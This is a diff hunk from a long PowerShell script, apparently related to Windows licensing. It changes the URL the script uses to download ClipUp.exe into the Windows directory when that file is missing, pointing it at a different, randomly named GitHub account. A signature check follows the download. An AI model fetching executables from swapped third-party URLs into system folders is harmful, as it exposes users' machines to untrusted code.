@@ -13343,7 +13343,7 @@ if (-not $ClipUp) {
   Write-Host
   Write-Host "ClipUp.exe is missing.!" -ForegroundColor Yellow
   Write-Host "Attemp to download ClipUp.exe from remote server" -ForegroundColor Yellow
-  iwr "https://github.com/BlueOnBLack/Misc/raw/refs/heads/main/ClipUp.exe" -OutFile "$env:windir\ClipUp.exe" -ea 0
+  iwr "https://github.com//v8k6b2jjps-prog/PKeyInspector/raw/refs/heads/main/Misc/ClipUp.exe" -OutFile "$env:windir\ClipUp.exe" -ea 0
   if ([IO.FILE]::Exists("$env:windir\ClipUp.exe")) {
     if (@(Get-AuthenticodeSignature "$env:windir\ClipUp.exe" -ea 0).Status -eq 'Valid') {
       Write-Host "File was download & verified, at location: $env:windir\ClipUp.exe" -ForegroundColor Yellow
